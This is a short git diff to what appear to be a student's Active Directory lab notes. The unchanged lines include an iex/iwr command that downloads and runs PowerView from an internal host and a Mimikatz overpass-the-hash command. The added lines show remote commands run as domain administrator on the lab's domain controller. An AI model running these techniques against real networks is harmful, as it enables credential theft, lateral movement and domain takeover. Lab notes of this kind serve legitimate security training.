@@ -70,3 +70,11 @@ iex (iwr http://172.16.100.36:8080/PowerView.ps1 -UseBasicParsing)
 
 Overpass the hash using mimikatz for lateral movement:
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash goes here> /run:powershell.exe"'
+
+Get access to domain administrator:
+PS C:\Windows\system32> whoami #if you tun whoami it will show your current user
+dcorp\student536
+PS C:\Windows\s3ystem32> Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local #have to run like this to know if we can execute command as domain admin
+dcorp\svcadmin 
+dcorp-dc
+
